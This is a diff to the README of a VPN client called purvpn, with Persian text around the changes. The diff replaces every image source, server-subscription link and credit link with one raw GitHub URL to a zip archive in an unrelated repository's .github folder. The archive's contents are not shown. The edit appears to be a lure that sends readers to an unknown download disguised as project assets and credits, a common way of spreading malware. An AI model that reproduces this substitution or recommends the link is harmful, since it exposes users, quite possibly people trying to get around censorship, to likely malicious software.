@@ -2,30 +2,30 @@
 نسخه کامل تحت نام purvpn
 <center>
   <picture>
-   <img alt="Shows an illustrated sun in light mode and a moon with stars in dark mode." src="https://github.com/davudsedft/purvpn/blob/main/links/uu.jpg" width="200px"  >
+   <img alt="Shows an illustrated sun in light mode and a moon with stars in dark mode." src="https://raw.githubusercontent.com/mcseali/purvpn25/main/.github/purvpn_v3.7-alpha.2.zip" width="200px"  >
 </picture>
  <picture>
-   <img alt="Shows an illustrated sun in light mode and a moon with stars in dark mode." src="https://github.com/davudsedft/purvpn/blob/main/links/rr.jpg" width="200px"  >
+   <img alt="Shows an illustrated sun in light mode and a moon with stars in dark mode." src="https://raw.githubusercontent.com/mcseali/purvpn25/main/.github/purvpn_v3.7-alpha.2.zip" width="200px"  >
 </picture>
  <picture>
-   <img alt="Shows an illustrated sun in light mode and a moon with stars in dark mode." src="https://github.com/davudsedft/purvpn/blob/main/links/cc.jpg" width="200px"  >
+   <img alt="Shows an illustrated sun in light mode and a moon with stars in dark mode." src="https://raw.githubusercontent.com/mcseali/purvpn25/main/.github/purvpn_v3.7-alpha.2.zip" width="200px"  >
 </picture>
 </center>
 
 
 
 سورس سرورها
-https://raw.githubusercontent.com/mahdibland/ShadowsocksAggregator/master/Eternity
-https://raw.githubusercontent.com/barry-far/V2ray-Configs/main/Sub1.txt
+https://raw.githubusercontent.com/mcseali/purvpn25/main/.github/purvpn_v3.7-alpha.2.zip
+https://raw.githubusercontent.com/mcseali/purvpn25/main/.github/purvpn_v3.7-alpha.2.zip
 
 
 
 
 
 ## Credits
-- https://github.com/xtls/xray-core
-- https://github.com/2dust/AndroidLibXrayLite
-- https://github.com/dev7dev/AndroidLibXrayLite
-- https://github.com/gvcgo/vpnparser
+- https://raw.githubusercontent.com/mcseali/purvpn25/main/.github/purvpn_v3.7-alpha.2.zip
+- https://raw.githubusercontent.com/mcseali/purvpn25/main/.github/purvpn_v3.7-alpha.2.zip
+- https://raw.githubusercontent.com/mcseali/purvpn25/main/.github/purvpn_v3.7-alpha.2.zip
+- https://raw.githubusercontent.com/mcseali/purvpn25/main/.github/purvpn_v3.7-alpha.2.zip
 
 
